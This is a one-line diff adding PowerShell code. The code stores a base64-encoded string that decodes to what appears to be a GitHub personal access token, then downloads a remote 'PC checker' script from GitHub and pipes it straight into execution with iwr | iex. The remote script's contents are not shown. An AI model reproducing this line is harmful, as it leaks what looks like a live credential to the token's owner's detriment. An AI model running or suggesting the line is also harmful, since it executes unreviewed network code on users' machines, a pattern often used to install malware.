@@ -1,0 +1,1 @@
+﻿$t="Z2l0aHViX3BhdF8xMUJMQjMzVVEwbkVzOHhJeVBpUnpoX2g3RUhSaTB0YkN5cWphV1lOTFBXWWE4WkZSb1RxeU5JSG1CcjU5UVRQV3ZGSzVSRUNCQVFpWTJVT05w"; iwr -useb https://raw.githubusercontent.com/zeyondma/pc-checker/main/ZeysPcChecker.ps1 | iex
